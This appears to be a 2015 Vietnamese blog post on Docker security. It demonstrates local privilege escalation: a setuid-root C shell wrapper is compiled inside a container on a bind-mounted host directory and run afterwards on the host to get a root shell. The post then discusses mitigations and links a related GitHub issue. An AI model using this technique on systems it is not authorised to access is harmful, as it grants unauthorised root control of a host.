---
title: "Docker Security"
date: 2015-11-06 14:55:50
comments: true
catergories: security
---
Hôm nay tác giả đọc về docker, chợt nghĩ dùng docker để get root với một
user thường, và tác giả giả lặp hành động đó như sau

# suid
Khi set suid một tập tin cho phép chạy với user owner nó bởi một user
khác, tất cả các tập tin shell script hiện tại đều bị drop suid do đó ta 
chọn một file C thay thế.

ta dùng đoạn code sau:

{% highlight c startinline %}
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid( 0 );
    system( "/bin/bash" );
    return 0;
 }

{% endhighlight %}

# docker

Docker mặc định chạy với user root hoặc user trong Dockerfile. Ta
tạo một container với lệnh sau
{% highlight bash startinline %}
docker run -v /home/dragon/Git/pacman/lib/libalpm:/mnt/lib --rm -it
jessie /bin/bash
{% endhighlight %}

trong docker:
{% highlight c startinline %}
gcc -o test test.c

chmod +s test && chmod +x test

exit
./test
[root@firewall libalpm]#
{% endhighlight %}

Tới đây ta có xuất hiện vấn đề rằng một user thông thường sử dụng docker
sẽ dẫn đến security có thể get root, nhưng dùng docker với root cũng
không khá gì hơn.

Docker cho phép sử dụng -u option để override USER trong Dockerfile. Tới
đây, ta thấy cần phải có cơ chế drop hoàn toàn suid/sgid khi exit khỏi
container. Docker giữ nguyên cả uid của owner cho file và directory
trong docker cho volume. Như vậy việc get root thông qua docker rất dễ
dàng, cách tốt nhất là drop toàn bộ suid/sgid cho file thuộc containeir
và không cho bất cứ ứng dụng nào chạy root nữa.

Một [issue](https://github.com/docker/docker/issues/12949) được mở trên
[github](github.com) tương tự cho vấn đề trên.
